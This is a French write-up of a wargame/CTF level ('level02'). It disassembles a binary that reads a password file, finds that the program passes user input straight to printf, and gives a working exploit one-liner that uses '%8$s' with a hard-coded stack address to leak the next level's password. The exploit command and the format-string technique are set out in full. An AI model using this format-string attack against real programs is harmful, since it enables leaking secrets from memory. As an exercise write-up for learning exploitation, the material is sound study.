# level 2 #

En regardant le desassemblage de `level02`, `main()` commence par ouvrir un fichier (chemin code en dur a l'adresse `0x400bb0`/`0x400bb2`, correspondant a `/home/users/level03/.pass`) et lit dedans un buffer local (`rbp-0xa0`) avec `fread`, en verifiant que la taille lue vaut bien `0x29` (41 octets) :

```
call   0x400700 <fopen@plt>

lea    rax,[rbp-0xa0]                 [rbp-0xa0] ou sera stockee le contenu lu par fread

call   0x400690 <fread@plt>           lit le contenu de /home/users/level03/.pass
mov    DWORD PTR [rbp-0xc],eax        met le retour de fread dans [rbp-0xc] qui est la taille de ce qui a ete lu

cmp    DWORD PTR [rbp-0xc],0x29       le taille qui a ete lu est compare a la valeur 41
je     0x40097d                       si taille == 41 -> ok, sinon erreur + exit
```

Le programme demande ensuite deux entrees a l'utilisateur, chacune via `fgets` (100 octets max) :
- La premiere est stockee dans `rbp-0x70`.
- La seconde est stockee dans `rbp-0x110`.

La seconde entree est comparee au contenu du fichier `.pass` (`rbp-0xa0`) avec `strncmp` sur `0x29` octets :

```
lea    rcx,[rbp-0x110]          2eme input utilisateur
lea    rax,[rbp-0xa0]           contenu du fichier .pass
mov    edx,0x29
mov    rsi,rcx
mov    rdi,rax
call   0x400670 <strncmp@plt>   strncmp(contenu fichier .pass, 2eme input, 41);
test   eax,eax
jne    0x400a96                 si different, branche "echec"
```

La faille est dans la branche d'echec:  si la comparaison echoue, le programme fait :

```
lea    rax,[rbp-0x70]           rax = 1ere entree utilisateur
mov    rdi,rax

call   0x4006c0 <printf@plt>    printf(input_utilisateur) pas de format fixe !
```


Le premier input est une format string, qui sera récupérée dans le buffer `s`, puis passé à `printf()`. 

En placant des `%p`/`%s` dans la format string, on peut lire la stack.

On met donc dedans `%8$s` qui va recuperer le 8eme argument, qui correspond au debut du 2eme buffer, et print la string s'y trouvant. 

Le deuxième input sera l'adresse de `ptr` qui contient le resultat de la lecture du fichier `/home/users/level03/.pass` (`rbp + 0xa0`) : le mot de passe 1

Parce que les addresses de la stack dans GDB et le terminal sont decalees, il faut unset les variables `LINES` et `COLUMNS` dans GDB qui sont rajoutees automatiquement pour tout mettre a niveau, et trouver la bonne adresse. 

Ca donne donc : 

```bash
(python -c 'print("%8$s")'; python -c 'print ("\x60\xe5\xff\xff\xff\x7f")') | ./level02
```
